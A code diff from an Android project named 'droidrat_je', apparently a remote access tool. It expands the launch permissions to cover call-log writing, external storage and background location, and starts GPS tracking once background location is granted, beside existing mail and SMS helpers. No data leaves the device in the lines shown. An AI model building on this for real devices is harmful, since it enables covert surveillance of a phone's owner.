@@ -11,6 +11,7 @@ import android.view.View;
 import android.widget.Button;
 
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.content.ContextCompat;
 
 import com.je_chen.droidrat_je.R;
 import com.je_chen.droidrat_je.appintent.call.Call;
@@ -57,10 +58,11 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
         packageManager = getPackageManager();
         permissionsCheck = new PermissionsCheck(packageManager);
 
-        String[] requestPermission ={
+        List<String> requestPermission = new ArrayList<>(Arrays.asList(
                 // PHONE
                 Manifest.permission.CALL_PHONE,
                 Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.WRITE_CALL_LOG,
 
                 // LOCATION
                 Manifest.permission.ACCESS_FINE_LOCATION,
@@ -75,15 +77,19 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
                 Manifest.permission.VIBRATE,
 
                 //網路
-                Manifest.permission.INTERNET
-        };
+                Manifest.permission.INTERNET,
+
+                //檔案
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE
+        ));
+
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            requestPermission.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+        }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            System.out.println(Arrays.toString(requestPermission));
-            permissionsCheck.checkPermission(this,requestPermission);
-        }
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            permissionsCheck.checkPermission(this,Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+            permissionsCheck.checkPermission(this, requestPermission.toArray(new String[requestPermission.size()]));
         }
 
         sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
@@ -94,7 +100,8 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
         sendMail = new SendMail();
         sms = new SMS();
         vibratorSystem = new VibratorSystem(this);
-        locationSystem = new LocationSystem(locationManager, "gps", 5000, 5);
+        if(ContextCompat.checkSelfPermission(this,Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED)
+            locationSystem = new LocationSystem(locationManager, "gps", 5000, 5);
 
         testButton = findViewById(R.id.testButton);
         testButton.setOnClickListener(this);
@@ -120,7 +127,7 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
     public void onClick(View view) {
         switch (view.getId()) {
             case R.id.testButton:
-
+                System.out.println(locationSystem.getLastKnownLocation("gps"));
                 break;
         }
     }
